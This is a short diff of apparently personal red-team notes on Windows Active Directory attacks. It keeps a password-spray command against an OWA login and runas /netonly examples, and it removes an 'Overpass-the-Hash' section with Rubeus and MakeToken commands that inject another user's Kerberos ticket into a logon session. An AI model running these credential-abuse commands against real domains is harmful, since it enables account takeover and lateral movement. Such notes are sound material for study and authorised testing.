@@ -87,15 +87,6 @@ python atomizer.py owa contoso.com 'Fall2018' emails.txt
 ```
 runas /netonly /user:nyameeeain "C:\Windows\System32\calc.exe"
 runas /netonly /user:nyameeeain powershell
-runas /netonly /user:nyameeeain "C:\Program Files\HeidiSQL\heidisql.exe"
 runas /netonly /user:insomnia\nyameeeain "C:\Windows\System32\calc.exe"
-```
-### Overpass-the-Hash
-A logon session can only accommodate one TGT at a time.If we pass n.lamb’s TGT into the current session (running as j.hunt), we’re going to cause some bad things to happen.
-So we can use the MakeToken task with dummy credentials, to create a sacrificial logon session that we can pass n.lamb’s TGT into instead.
-```
-Rubeus asktgt /user:n.lamb /rc4:REDACTED
-MakeToken n.lamb cyberbotic.io DoesNotMatter
-Rubeus ptt /ticket:doIFXDCCBVi[...snip...]bDWN5YmVyYm90aWMuaW8=
 ```
 
